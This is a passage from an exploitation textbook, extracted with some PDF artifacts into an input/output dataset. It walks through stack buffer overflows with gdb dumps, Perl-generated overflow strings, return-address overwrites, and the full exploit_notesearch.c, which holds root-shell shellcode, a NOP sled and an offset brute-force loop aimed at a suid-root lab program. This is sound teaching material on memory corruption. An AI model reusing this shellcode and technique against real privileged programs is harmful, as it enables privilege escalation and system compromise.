bytes of the\npassword buffer ( ) are shown at 0xbffff7c0.\nThe stack frame contains more than just the local variables and pad-\nding. Elements of the check_authentication() stack frame are shown below.\nFirst, the memory saved for the local variables is shown in italic. This starts\nat the auth_flag variable at 0xbffff7bc and continues through the end of the\n16-byte password_buffer variable. The next few values on the stack are just\npadding the compiler threw in, plus something called the saved frame pointer.\nIf the program is compiled with the flag -fomit-frame-pointer fo(cid:0)r optimiza-\ntion, the frame pointer won’t be used in the stack frame. A(cid:2)t the value\n0x080484bb is the return address of the stack frame, and at the address\n0xbffffe9b7 is a pointer to a string containing 30 As. This must be the argu-\nment to the check_authentication() function.\n(gdb) x/32xw $esp\n0xbffff7a0: 0x00000000 0x08049744 0xbffff7b8 0x080482d9\n0xbffff7b0: 0xb7f9f729 0xb7fd6ff4 0xbffff7e8 0x00000000\n0xbffff7c0: 0xb7fd6ff4 0xbffff880 0xbffff7e8 0xb7fd6ff4\n130 0x300\n(cid:0)\n0xbffff7d0: (cid:2) 0xb7ff47b0 0x08048510 0xbffff7e8 0x080484bb\n0xbffff7e0: 0xbffff9b7 0x08048510 0xbffff848 0xb7eafebc\n0xbffff7f0: 0x00000002 0xbffff874 0xbffff880 0xb8001898\n0xbffff800: 0x00000000 0x00000001 0x00000001 0x00000000\n0xbffff810: 0xb7fd6ff4 0xb8000ce0 0x00000000 0xbffff848\n(gdb) x/32xb 0xbffff9b7\n0xbffff9b7: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41\n0xbffff9bf: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41\n0xbffff9c7: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41\n0xbffff9cf: 0x41 0x41 0x41 0x41 0x41 0x41 0x00 0x53\n(gdb) x/s 0xbffff9b7\n0xbffff9b7: 'A' <repeats 30 times>\n(gdb)\nThe return address in a stack frame can be located by understanding\nhow the stack frame is created. This process begins in the main() function,\neven before the function call.\n(gdb) disass main\nDump of assembler code for function main:\n0x08048474 <main+0>: push ebp\n0x08048475 <main+1>: mov ebp,esp\n0x08048477 <main+3>: sub esp,0x8\n0x0804847a <main+6>: and esp,0xfffffff0\n0x0804847d <main+9>: mov eax,0x0\n0x08048482 <main+14>: sub esp,eax\n0x08048484 <main+16>: cmp DWORD PTR [ebp+8],0x1\n0x08048488 <main+20>: jg 0x80484ab <main+55>\n0x0804848a <main+22>: mov eax,DWORD PTR [ebp+12]\n0x0804848d <main+25>: mov eax,DWORD PTR [eax]\n0x0804848f <main+27>: mov DWORD PTR [esp+4],eax\n0x08048493 <main+31>: mov DWORD PTR [esp],0x80485e5\n0x0804849a <main+38>: call 0x804831c <printf@plt>\n0x0804849f <main+43>: mov DWORD PTR [esp],0x0\n0x080484a6 <main+50>: call 0x804833c <exit@plt>\n0x080484ab <main+55>: mov eax,DWORD PTR [ebp+12]\n0x080484ae <main+58>: add eax,0x4\n0x080484b1 <main+61>: mov eax,DWORD PTR [eax]\n0x080484b3 <main+63>: mov DWORD PTR [esp],eax\n0x080484b6 <main+66>: call 0x8048414 <check_authentication>\n0x080484bb <main+71>: test eax,eax\n0x080484bd <main+73>: je 0x80484e5 <main+113>\n0x080484bf <main+75>: mov DWORD PTR [esp],0x80485fb\n0x080484c6 <main+82>: call 0x804831c <printf@plt>\n0x080484cb <main+87>: mov DWORD PTR [esp],0x8048619\n0x080484d2 <main+94>: call 0x804831c <printf@plt>\n0x080484d7 <main+99>: mov DWORD PTR [esp],0x8048630\n0x080484de <main+106>: call 0x804831c <printf@plt>\n0x080484e3 <main+111>: jmp 0x80484f1 <main+125>\n0x080484e5 <main+113>: mov DWORD PTR [esp],0x804864d\n0x080484ec <main+120>: call 0x804831c <printf@plt>\n0x080484f1 <main+125>: leave\n0x080484f2 <main+126>: ret\nEnd of assembler dump.\n(gdb)\nExploitation 131\nNotice the two lines shown in bold on page 131. At this point, the EAX\nregister contains a pointer to the first command-line argument. This is also the\nargument to check_authentication(). This first assembly instruction writes EAX\nto where ESP is pointing (the top of the stack). This starts the stack frame for\ncheck_authentication() with the function argument. The second instruction\nis the actual call. This instruction pushes the address of the next instruction\nto the stack and moves the execution pointer register (EIP) to the start of the\ncheck_authentication() function. The address pushed to the stack is the return\naddress for the stack frame. In this case, the address of the next instruction is\n0x080484bb, so that is the return address.\n(gdb) disass check_authentication\nDump of assembler code for function check_authentication:\n0x08048414 <check_authentication+0>: push ebp\n0x08048415 <check_authentication+1>: mov ebp,esp\n0x08048417 <check_authentication+3>: sub esp,0x38\n...\n0x08048472 <check_authentication+94>: leave\n0x08048473 <check_authentication+95>: ret\nEnd of assembler dump.\n(gdb) p 0x38\n$3 = 56\n(gdb) p 0x38 + 4 + 4\n$4 = 64\n(gdb)\nExecution will continue into the check_authentication() function as EIP is\nchanged, and the first few instructions (shown in bold above) finish saving\nmemory for the stack frame. These instructions are known as the function\nprologue. The first two instructions are for the saved frame pointer, and the\nthird instruction subtracts 0x38 from ESP. This saves 56 bytes for the local\nvariables of the function. The return address and the saved frame pointer\nare already pushed to the stack and account for the additional 8 bytes of\nthe 64-byte stack frame.\nWhen the function finishes, the leave and ret instructions remove the\nstack frame and set the exec(cid:0)ution pointer register (EIP) to the saved return\naddress in the stack frame ( ). This brings the program execution back to\nthe next instruction in main() after the function call at 0x080484bb. This process\nhappens every time a function is called in any program.\n(gdb) x/32xw $esp\n0xbffff7a0: 0x00000000 0x08049744 0xbffff7b8 0x080482d9\n0xbffff7b0: 0xb7f9f729 0xb7fd6ff4 0xbffff7e8 0x00000000\n0xbffff7c0: 0xb7fd6ff4 0xbffff880 0xbffff7e8 (cid:0) 0xb7fd6ff4\n0xbffff7d0: 0xb7ff47b0 0x08048510 0xbffff7e8 0x080484bb\n0xbffff7e0: 0xbffff9b7 0x08048510 0xbffff848 0xb7eafebc\n0xbffff7f0: 0x00000002 0xbffff874 0xbffff880 0xb8001898\n0xbffff800: 0x00000000 0x00000001 0x00000001 0x00000000\n0xbffff810: 0xb7fd6ff4 0xb8000ce0 0x00000000 0xbffff848\n132 0x300"
  },
  {
    "input": "0x330 Experimenting with BASH",
    "output": "(gdb) cont\nContinuing.\nBreakpoint 3, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>)\nat auth_overflow2.c:16\n16 return auth_flag;\n(gdb) x/32xw $esp\n0xbffff7a0: 0xbffff7c0 0x080485dc 0xbffff7b8 0x080482d9\n0xbffff7b0: 0xb7f9f729 0xb7fd6ff4 0xbffff7e8 0x00000000\n0xbffff7c0: 0x41414141 0x41414141 0x41414141 (cid:0) 0x41414141\n0xbffff7d0: 0x41414141 0x41414141 0x41414141 0x08004141\n0xbffff7e0: 0xbffff9b7 0x08048510 0xbffff848 0xb7eafebc\n0xbffff7f0: 0x00000002 0xbffff874 0xbffff880 0xb8001898\n0xbffff800: 0x00000000 0x00000001 0x00000001 0x00000000\n0xbffff810: 0xb7fd6ff4 0xb8000ce0 0x00000000 0xbffff848\n(gdb) cont\nContinuing.\nProgram received signal SIGSEGV, Segmentation fault.\n0x08004141 in ?? ()\n(gdb)\nWhen some of the bytes of the saved return address are overwritten, the\nprogram will still try to use that value to restore the execution pointer regis-\nter (EIP). This usually results in a crash, since execution is essentially jumping\nto a random location. But this value doesn’t need to be random. If the over-\nwrite is controlled, execution can, in turn, be controlled to jump to a specific\nlocation. But where should we tell it to go?\n0x330 Experimenting with BASH\nSince so much of hacking is rooted in exploitation and experimentation, the\nability to quickly try different things is vital. The BASH shell and Perl are\ncommon on most machines and are all that is needed to experiment with\nexploitation.\nPerl is an interpreted programming language with a print command that\nhappens to be particularly suited to generating long sequences of characters.\nPerl can be used to execute instructions on the command line by using the\n-e switch like this:\nreader@hacking:~/booksrc $ perl -e 'print \"A\" x 20;'\nAAAAAAAAAAAAAAAAAAAA\nThis command tells Perl to execute the commands found between the\nsingle quotes—in this case, a single command of print \"A\" x 20;. This com-\nmand prints the character A 20 times.\nAny character, such as a nonprintable character, can also be printed by\nusing \\x##, where ## is the hexadecimal value of the character. In the following\nexample, this notation is used to print the character A, which has the hexa-\ndecimal value of 0x41.\nExploitation 133\nreader@hacking:~/booksrc $ perl -e 'print \"\\x41\" x 20;'\nAAAAAAAAAAAAAAAAAAAA\nIn addition, string concatenation can be done in Perl with a period (.).\nThis can be useful when stringing multiple addresses together.\nreader@hacking:~/booksrc $ perl -e 'print \"A\"x20 . \"BCD\" . \"\\x61\\x66\\x67\\x69\"x2 . \"Z\";'\nAAAAAAAAAAAAAAAAAAAABCDafgiafgiZ\nAn entire shell command can be executed like a function, returning its\noutput in place. This is done by surrounding the command with parentheses\nand prefixing a dollar sign. Here are two examples:\nreader@hacking:~/booksrc $ $(perl -e 'print \"uname\";')\nLinux\nreader@hacking:~/booksrc $ una$(perl -e 'print \"m\";')e\nLinux\nreader@hacking:~/booksrc $\nIn each case, the output of the command found between the parentheses\nis substituted for the command, and the command uname is executed. This\nexact command-substitution effect can be accomplished with grave accent\nmarks (`, the tilted single quote on the tilde key). You can use whichever\nsyntax feels more natural for you; however, the parentheses syntax is easier\ntoread for most people.\nreader@hacking:~/booksrc $ u`perl -e 'print \"na\";'`me\nLinux\nreader@hacking:~/booksrc $ u$(perl -e 'print \"na\";')me\nLinux\nreader@hacking:~/booksrc $\nCommand substitution and Perl can be used in combination to quickly\ngenerate overflow buffers on the fly. You can use this technique to easily test\nthe overflow_example.c program with buffers of precise lengths.\nreader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print \"A\"x30')\n[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'\n[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)\n[STRCPY] copying 30 bytes into buffer_two\n[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAAA'\n[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)\nSegmentation fault (core dumped)\nreader@hacking:~/booksrc $ gdb -q\n(gdb) print 0xbffff7f4 - 0xbffff7e0\n$1 = 20\n134 0x300\n(gdb) quit\nreader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print \"A\"x20 . \"ABCD\"')\n[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'\n[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)\n[STRCPY] copying 24 bytes into buffer_two\n[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAABCD'\n[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAABCD'\n[AFTER] value is at 0xbffff7f4 and is 1145258561 (0x44434241)\nreader@hacking:~/booksrc $\nIn the output above, GDB is used as a hexadecimal calculator to figure\nout the distance between buffer_two (0xbfffff7e0) and the value variable\n(0xbffff7f4), which turns out to be 20 bytes. Using this distance, the value\nvariable is overwritten with the exact value 0x44434241, since the characters A,\nB, C, and D have the hex values of 0x41, 0x42, 0x43, and 0x44, respectively. The\nfirst character is the least significant byte, due to the little-endian architec-\nture. This means if you wanted to control the value variable with something\nexact, like 0xdeadbeef, you must write those bytes into memory in reverse order.\nreader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print \"A\"x20 . \"\\xef\\xbe\\xad\\xde\"')\n[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'\n[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)\n[STRCPY] copying 24 bytes into buffer_two\n[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAA??'\n[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAA??'\n[AFTER] value is at 0xbffff7f4 and is -559038737 (0xdeadbeef)\nreader@hacking:~/booksrc $\nThis technique can be applied to overwrite the return address in the\nauth_overflow2.c program with an exact value. In the example below, we will\noverwrite the return address with a different address in main().\nreader@hacking:~/booksrc $ gcc -g -o auth_overflow2 auth_overflow2.c\nreader@hacking:~/booksrc $ gdb -q ./auth_overflow2\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) disass main\nDump of assembler code for function main:\n0x08048474 <main+0>: push ebp\n0x08048475 <main+1>: mov ebp,esp\n0x08048477 <main+3>: sub esp,0x8\n0x0804847a <main+6>: and esp,0xfffffff0\n0x0804847d <main+9>: mov eax,0x0\n0x08048482 <main+14>: sub esp,eax\n0x08048484 <main+16>: cmp DWORD PTR [ebp+8],0x1\n0x08048488 <main+20>: jg 0x80484ab <main+55>\n0x0804848a <main+22>: mov eax,DWORD PTR [ebp+12]\nExploitation 135\n0x0804848d <main+25>: mov eax,DWORD PTR [eax]\n0x0804848f <main+27>: mov DWORD PTR [esp+4],eax\n0x08048493 <main+31>: mov DWORD PTR [esp],0x80485e5\n0x0804849a <main+38>: call 0x804831c <printf@plt>\n0x0804849f <main+43>: mov DWORD PTR [esp],0x0\n0x080484a6 <main+50>: call 0x804833c <exit@plt>\n0x080484ab <main+55>: mov eax,DWORD PTR [ebp+12]\n0x080484ae <main+58>: add eax,0x4\n0x080484b1 <main+61>: mov eax,DWORD PTR [eax]\n0x080484b3 <main+63>: mov DWORD PTR [esp],eax\n0x080484b6 <main+66>: call 0x8048414 <check_authentication>\n0x080484bb <main+71>: test eax,eax\n0x080484bd <main+73>: je 0x80484e5 <main+113>\n0x080484bf <main+75>: mov DWORD PTR [esp],0x80485fb\n0x080484c6 <main+82>: call 0x804831c <printf@plt>\n0x080484cb <main+87>: mov DWORD PTR [esp],0x8048619\n0x080484d2 <main+94>: call 0x804831c <printf@plt>\n0x080484d7 <main+99>: mov DWORD PTR [esp],0x8048630\n0x080484de <main+106>: call 0x804831c <printf@plt>\n0x080484e3 <main+111>: jmp 0x80484f1 <main+125>\n0x080484e5 <main+113>: mov DWORD PTR [esp],0x804864d\n0x080484ec <main+120>: call 0x804831c <printf@plt>\n0x080484f1 <main+125>: leave\n0x080484f2 <main+126>: ret\nEnd of assembler dump.\n(gdb)\nThis section of code shown in bold contains the instructions that display\nthe Access Granted message. The beginning of this section is at 0x080484bf,\nso if the return address is overwritten with this value, this block of instruc-\ntions will be executed. The exact distance between the return address and\nthe start of the password_buffer can change due to different compiler versions\nand different optimization flags. As long as the start of the buffer is aligned\nwith DWORDs on the stack, this mutability can be accounted for by simply\nrepeating the return address many times. This way, at least one of the instances\nwill overwrite the return address, even if it has shifted around due to compiler\noptimizations.\nreader@hacking:~/booksrc $ ./auth_overflow2 $(perl -e 'print \"\\xbf\\x84\\x04\\x08\"x10')\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nAccess Granted.\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nSegmentation fault (core dumped)\nreader@hacking:~/booksrc $\nIn the example above, the target address of 0x080484bf is repeated 10 times\nto ensure the return address is overwritten with the new target address. When\nthe check_authentication() function returns, execution jumps directly to the\nnew target address instead of returning to the next instruction after the call.\nThis gives us more control; however, we are still limited to using instructions\nthat exist in the original programming.\n136 0x300\nThe notesearch program is vulnerable to a buffer overflow on the line\nmarked in bold here.\nint main(int argc, char *argv[]) {\nint userid, printing=1, fd; // File descriptor\nchar searchstring[100];\nif(argc > 1) // If there is an arg\nstrcpy(searchstring, argv[1]); // that is the search string;\nelse // otherwise,\nsearchstring[0] = 0; // search string is empty.\nThe notesearch exploit uses a similar technique to overflow a buffer into\nthe return address; however, it also injects its own instructions into memory\nand then returns execution there. These instructions are called shellcode, and\nthey tell the program to restore privileges and open a shell prompt. This is\nespecially devastating for the notesearch program, since it is suid root. Since\nthis program expects multiuser access, it runs under higher privileges so it can\naccess its data file, but the program logic prevents the user from using these\nhigher privileges for anything other than accessing the data file—at least\nthat’s the intention.\nBut when new instructions can be injected in and execution can be\ncontrolled with a buffer overflow, the program logic is meaningless. This\ntechnique allows the program to do things it was never programmed to do,\nwhile it’s still running with elevated privileges. This is the dangerous combina-\ntion that allows the notesearch exploit to gain a root shell. Let’s examine the\nexploit further.\nreader@hacking:~/booksrc $ gcc -g exploit_notesearch.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 1\n1 #include <stdio.h>\n2 #include <stdlib.h>\n3 #include <string.h>\n4 char shellcode[]=\n5 \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n6 \"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n7 \"\\xe1\\xcd\\x80\";\n8\n9 int main(int argc, char *argv[]) {\n10 unsigned int i, *ptr, ret, offset=270;\n(gdb)\n11 char *command, *buffer;\n12\n13 command = (char *) malloc(200);\n14 bzero(command, 200); // Zero out the new memory.\n15\n16 strcpy(command, \"./notesearch \\'\"); // Start command buffer.\n17 buffer = command + strlen(command); // Set buffer at the end.\n18\n19 if(argc > 1) // Set offset.\nExploitation 137\n20 offset = atoi(argv[1]);\n(gdb)\n21\n22 ret = (unsigned int) &i - offset; // Set return address.\n23\n24 for(i=0; i < 160; i+=4) // Fill buffer with return address.\n25 *((unsigned int *)(buffer+i)) = ret;\n26 memset(buffer, 0x90, 60); // Build NOP sled.\n27 memcpy(buffer+60, shellcode, sizeof(shellcode)-1);\n28\n29 strcat(command, \"\\'\");\n30\n(gdb) break 26\nBreakpoint 1 at 0x80485fa: file exploit_notesearch.c, line 26.\n(gdb) break 27\nBreakpoint 2 at 0x8048615: file exploit_notesearch.c, line 27.\n(gdb) break 28\nBreakpoint 3 at 0x8048633: file exploit_notesearch.c, line 28.\n(gdb)\nThe notesearch exploit generates a buffer in lines 24 through 27 (shown\nabove in bold). The first part is a for loop that fills the buffer with a 4-byte\naddress stored in the ret variable. The loop increments i by 4 each time. This\nvalue is added to the buffer address, and the whole thing is typecast as a\nunsigned integer pointer. This has a size of 4, so when the whole thing is\ndereferenced, the entire 4-byte value found in ret is written.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nBreakpoint 1, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:26\n26 memset(buffer, 0x90, 60); // build NOP sled\n(gdb) x/40x buffer\n0x804a016: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a026: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a036: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a046: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a056: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a066: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a076: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a086: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a096: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a0a6: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n(gdb) x/s command\n0x804a008: \"./notesearch\n'¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶û\nÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿\"\n(gdb)\nAt the first breakpoint, the buffer pointer shows the result of the for\nloop. You can also see the relationship between the command pointer and\nthe buffer pointer. The next instruction is a call to memset(), which starts at the\nbeginning of the buffer and sets 60 bytes of memory with the value 0x90.\n138 0x300\n(gdb) cont\nContinuing.\nBreakpoint 2, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:27\n27 memcpy(buffer+60, shellcode, sizeof(shellcode)-1);\n(gdb) x/40x buffer\n0x804a016: 0x90909090 0x90909090 0x90909090 0x90909090\n0x804a026: 0x90909090 0x90909090 0x90909090 0x90909090\n0x804a036: 0x90909090 0x90909090 0x90909090 0x90909090\n0x804a046: 0x90909090 0x90909090 0x90909090 0xbffff6f6\n0x804a056: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a066: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a076: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a086: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a096: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a0a6: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n(gdb) x/s command\n0x804a008: \"./notesearch '\", '\\220' <repeats 60 times>, \"¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿\n¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿\"\n(gdb)\nFinally, the call to memcpy() will copy the shellcode bytes into buffer+60.\n(gdb) cont\nContinuing.\nBreakpoint 3, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:29\n29 strcat(command, \"\\'\");\n(gdb) x/40x buffer\n0x804a016: 0x90909090 0x90909090 0x90909090 0x90909090\n0x804a026: 0x90909090 0x90909090 0x90909090 0x90909090\n0x804a036: 0x90909090 0x90909090 0x90909090 0x90909090\n0x804a046: 0x90909090 0x90909090 0x90909090 0x3158466a\n0x804a056: 0xcdc931db 0x2f685180 0x6868732f 0x6e69622f\n0x804a066: 0x5351e389 0xb099e189 0xbf80cd0b 0xbffff6f6\n0x804a076: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a086: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a096: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n0x804a0a6: 0xbffff6f6 0xbffff6f6 0xbffff6f6 0xbffff6f6\n(gdb) x/s command\n0x804a008: \"./notesearch '\", '\\220' <repeats 60 times>, \"1À1Û1É\\231°¤Í\\200j\\vXQh//shh/\nbin\\211ãQ\\211âS\\211áÍ\\200¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿\"\n(gdb)\nNow the buffer contains the desired shellcode and is long enough to over-\nwrite the return address. The difficulty of finding the exact location of the\nreturn address is eased by using the repeated return address technique. But\nthis return address must point to the shellcode located in the same buffer.\nThis means the actual address must be known ahead of time, before it even\ngoes into memory. This can be a difficult prediction to try to make with a\ndynamically changing stack. Fortunately, there is another hacking technique,\nExploitation 139\ncalled the NOP sled, that can assist with this difficult chicanery. NOP is an\nassembly instruction that is short for no operation. It is a single-byte instruction\nthat does absolutely nothing. These instructions are sometimes used to waste\ncomputational cycles for timing purposes and are actually necessary in the\nSparc processor architecture, due to instruction pipelining. In this case, NOP\ninstructions are going to be used for a different purpose: as a fudge factor.\nWe’ll create a large array (or sled) of these NOP instructions and place it\nbefore the shellcode; then, if the EIP register points to any address found in\nthe NOP sled, it will increment while executing each NOP instruction, one at\na time, until it finally reaches the shellcode. This means that as long as the\nreturn address is overwritten with any address found in the NOP sled, the EIP\nregister will slide down the sled to the shellcode, which will execute properly.\nOn the x86 architecture, the NOP instruction is equivalent to the hex byte\n0x90. This means our completed exploit buffer looks something like this:\nNOP sled Shellcode Repeated return address\nEven with a NOP sled, the approximate location of the buffer in memory\nmust be predicted in advance. One technique for approximating the memory\nlocation is to use a nearby stack location as a frame of reference. By subtract-\ning an offset from this location, the relative address of any variable can be\nobtained.\nFrom exploit_notesearch.c\nunsigned int i, *ptr, ret, offset=270;\nchar *command, *buffer;\ncommand = (char *) malloc(200);\nbzero(command, 200); // Zero out the new memory.\nstrcpy(command, \"./notesearch \\'\"); // Start command buffer.\nbuffer = command + strlen(command); // Set buffer at the end.\nif(argc > 1) // Set offset.\noffset = atoi(argv[1]);\nret = (unsigned int) &i - offset; // Set return address.\nIn the notesearch exploit, the address of the variable i in main()’s stack\nframe is used as a point of reference. Then an offset is subtracted from that\nvalue; the result is the target return address. This offset was previously deter-\nmined to be 270, but how is this number calculated?\nThe easiest way to determine this offset is experimentally. The debugger\nwill shift memory around slightly and will drop privileges when the suid\nroot notesearch program is executed, making debugging much less useful\nin this case.\n140 0x300\nSince the notesearch exploit allows an optional command-line argument\nto define the offset, different offsets can quickly be tested.\nreader@hacking:~/booksrc $ gcc exploit_notesearch.c\nreader@hacking:~/booksrc $ ./a.out 100\n-------[ end of note data ]-------\nreader@hacking:~/booksrc $ ./a.out 200\n-------[ end of note data ]-------\nreader@hacking:~/booksrc $\nHowever, doing this manually is tedious and stupid. BASH also has a for\nloop that can be used to automate this process. The seq command is a simple\nprogram that generates sequences of numbers, which is typically used with\nlooping.\nreader@hacking:~/booksrc $ seq 1 10\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\nreader@hacking:~/booksrc $ seq 1 3 10\n1\n4\n7\n10\nreader@hacking:~/booksrc $\nWhen only two arguments are used, all the numbers from the first argu-\nment to the second are generated. When three arguments are used, the middle\nargument dictates how much to increment each time. This can be used with\ncommand substitution to drive BASH’s for loop.\nreader@hacking:~/booksrc $ for i in $(seq 1 3 10)\n> do\n> echo The value is $i\n> done\nThe value is 1\nThe value is 4\nThe value is 7\nThe value is 10\nreader@hacking:~/booksrc $\nExploitation 141"
  },
  {
    "input": "0x331 Using the Environment",
    "output": "The function of the for loop should be familiar, even if the syntax is a\nlittle different. The shell variable $i iterates through all the values found in\nthe grave accents (generated by seq). Then everything between the do and\ndone keywords is executed. This can be used to quickly test many different\noffsets. Since the NOP sled is 60 bytes long, and we can return anywhere on\nthe sled, there is about 60 bytes of wiggle room. We can safely increment the\noffset loop with a step of 30 with no danger of missing the sled.\nreader@hacking:~/booksrc $ for i in $(seq 0 30 300)\n> do\n> echo Trying offset $i\n> ./a.out $i\n> done\nTrying offset 0\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\nWhen the right offset is used, the return address is overwritten with a\nvalue that points somewhere on the NOP sled. When execution tries to return\nto that location, it will just slide down the NOP sled into the injected shellcode\ninstructions. This is how the default offset value was discovered.\n0x331 Using the Environment\nSometimes a buffer will be too small to hold even shellcode. Fortunately, there\nare other locations in memory where shellcode can be stashed. Environment\nvariables are used by the user shell for a variety of things, but what they are\nused for isn’t as important as the fact they are located on the stack and can\nbe set from the shell. The example below sets an environment variable called\nMYVAR to the string test. This environment variable can be accessed by prepend-\ning a dollar sign to its name. In addition, the env command will show all the\nenvironment variables. Notice there are several default environment vari-\nables already set.\nreader@hacking:~/booksrc $ export MYVAR=test\nreader@hacking:~/booksrc $ echo $MYVAR\ntest\nreader@hacking:~/booksrc $ env\nSSH_AGENT_PID=7531\nSHELL=/bin/bash\nDESKTOP_STARTUP_ID=\nTERM=xterm\nGTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2\nWINDOWID=39845969\nOLDPWD=/home/reader\nUSER=reader\nLS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=4\n0;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;\n31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*\n.rpm=01;31:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35\n:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.mov=01;\n142 